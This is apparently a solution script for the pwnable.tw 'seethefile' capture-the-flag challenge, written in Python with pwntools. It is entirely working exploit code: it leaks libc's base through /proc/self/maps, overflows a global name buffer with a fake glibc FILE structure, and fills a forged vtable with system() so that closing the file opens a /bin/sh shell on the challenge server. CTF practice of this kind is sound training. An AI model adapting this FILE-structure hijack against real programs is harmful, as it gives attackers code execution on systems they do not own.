from pwn import *
import string

def open_file(name):
	print p.recv()
	p.sendline("1")
	print p.recv()
	p.sendline(name)

def read_file():
	print p.recv()
	p.sendline("2")

def show():
	print p.recv()
	p.sendline("3")

def close_file():
	print p.recv()
	p.sendline("4")

def quit(payload):
	print p.recv()
	p.sendline("5")
	print p.recv()
	p.sendline(payload)

binary = ELF("./seethefile")
libc = ELF("./libc_32.so.6")
if len(sys.argv) == 1:
	p = process("./seethefile", env={"LD_PRELOAD":"./libc_32.so.6"})
else:
	p = remote("chall.pwnable.tw", 10200)

open_file("/proc/self/maps")
read_file()
show()

libc_base = 0xf7e20000
if len(sys.argv) != 1:
	print p.recv()
	p.recvuntil("[heap]\n")
	libc_base = int(p.recvuntil("-")[:-1],16) + 0x1000
	log.info("libc base : 0x%x" % libc_base)

close_file()

name = 0x0804B260
welcome = 0x08048955
fake_fp = name + 0x24
system = libc_base + libc.symbols['system']
puts = binary.plt['puts']

log.info("system addr : 0x%x" % system)

payload = "\x00"*0x20					# name	: padding
payload += p32(fake_fp)					# fp	: fake file structure pointer
payload += "/bin/sh\x00"+"\x00"*(0x30-8)		# fake file structure
payload += p32(0) + p32(name) + p32(3) + p32(0)
payload += p32(0) * 2 + p32(name) + p32(0xffffffff)
payload += p32(0xffffffff) + p32(0) + p32(name) + p32(0)
#payload += "\x00"*0x34
payload += p32(fake_fp+0x94+4)*14				# fake _io_file_jumps pointer
payload += p32(0)*2 + p32(system)*18			# fake file_close spray 

quit(payload)
p.interactive()
